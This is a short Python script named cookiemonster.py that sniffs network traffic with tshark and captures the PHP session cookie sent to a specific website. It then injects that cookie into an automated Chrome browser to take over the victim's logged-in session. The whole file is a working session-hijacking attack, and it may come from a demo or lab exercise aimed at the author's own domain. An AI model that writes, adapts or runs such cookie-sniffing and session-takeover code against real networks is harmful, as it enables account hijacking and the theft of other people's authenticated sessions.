# cookiemonster.py
import selenium.webdriver
import subprocess

# Defines the duration of capture
duration = input("Duration of capture (seconds): ")

commands = ['tshark', '-Y', '"http.cookie and http.host matches ".mikolaj.ovh""', '-T', 'fields', '-e', 'http.cookie', '-Y', 'http.cookie', '-a', 'duration:' + str(duration)]

result = subprocess.run(commands, stdout=subprocess.PIPE)
output = result.stdout.decode("utf-8").split()

# Finds the PHPSESSID in output

phpsessid = None

for p in output:
        if 'PHPSESSID=' in p:
                phpsessid = p.split("PHPSESSID=", 1)[1]

if phpsessid is None:
        print("Session was not captured successfully!")
else:
        print("Captured PHP session ID: {}".format(phpsessid))

        # Saves the prepared cookie with updated session ID in Chrome browser
        driver = selenium.webdriver.Chrome("/users/pawelnarolski/chromedriver")
        driver.get("http://mikolaj.ovh/")
        driver.add_cookie({'name':'PHPSESSID', 'value':phpsessid})
        driver.refresh()

        print("Cookie successfully generated and planted. Loading browser. Cookie's contents:")

        # Check if cookie was printed
        for cookie in driver.get_cookies():
                print ((cookie['name'], cookie['value']))